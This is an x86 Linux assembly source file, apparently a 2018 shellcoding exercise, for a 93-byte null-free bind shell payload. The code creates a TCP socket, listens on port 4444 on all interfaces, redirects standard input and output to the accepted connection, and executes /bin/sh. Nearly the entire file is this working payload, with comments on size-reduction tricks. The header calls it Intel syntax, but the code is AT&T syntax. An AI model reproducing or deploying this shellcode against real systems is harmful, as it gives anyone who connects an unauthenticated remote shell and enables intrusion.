
/* 

[*] shell bind tcp, adp - 2018

   * intel syntax 
   * no 0x00
   * 93 bytes, without socketoptions
   * push/pop for init regs  
   * cdq to zero out edx by extending eax (edx = 0)
   * xchg to clean eax so we can use movb
   
[*] refs 

	https://www.abatchy.com/2017/04/shellcode-reduction-tips-x86
	https://modexp.wordpress.com/2017/06/07/x86-trix-one/
	http://tips-tricks-ideas.blogspot.com/2008/12/advanced-shellcoding-techniques.html
	http://programming4.us/security/706.aspx
*/

.global main

.text

main: 
        /* int socket(int domain, int type, int protocol) */
	pushl $102
	popl %eax
	cdq 	/* edx is now 0 */
	pushl $1
	popl %ebx
        pushl %edx               /* IPPROTO_IP = 0 */
        pushl $1                 /* SOCK_STREAM = 1 */
        pushl $2                 /* AF_INET = 2 */
	movl %esp, %ecx
        int $0x80              
	xchg %eax, %edi /* edi was 0 before */

        /* int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) */
	movb $102, %al
	pushl $2
	popl %ebx
	pushl %edx		/* INADDR_ANY = 0 (uint32_t) */
        pushw $0x5c11           /* port in byte reverse order = 4444 */
        pushw $0x0002           /* AF_INET = 2 (unsigned short int) */
	movl %esp, %ecx
        pushl $16               /* sockaddr struct size 16 (socklen_t) */
        pushl %ecx              /* sockaddr_in struct pointer (struct sockaddr *)*/
	pushl %edi		/* socket fd */
	movl %esp, %ecx
        int $0x80               

        /* int listen(int sockfd, int backlog) */
	movb $102, %al
	pushl $4
	popl %ebx
	pushl %edx /* zero, socket backlog */
	pushl %edi /* socket fd */
	movl %esp, %ecx
        int $0x80             

        /* int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) */
	movb $102, %al
	pushl $5
	popl %ebx
        pushl %edx                /* NULL */
        pushl %edx                /* NULL */
	pushl %edi
	movl %esp, %ecx
        int $0x80              

	/* int dup2(int oldfd, int newfd) */
	xchg %eax, %ebx /* fd goes to ebx */
	pushl $2
	popl %ecx

dup_syscall:
        mov $63, %al
        int $0x80
        dec %ecx
        jns dup_syscall		

        /* int execve(const char *filename, char *const argv[], char *const envp[]) */
	movb $11,%al
	pushl %edx /* zero */
        pushl $0x68732f2f       # "//sh"
        pushl $0x6e69622f       # "/bin"
	pushl %esp
	popl %ebx
	movl %edx, %ecx # zero, null
        int $0x80               

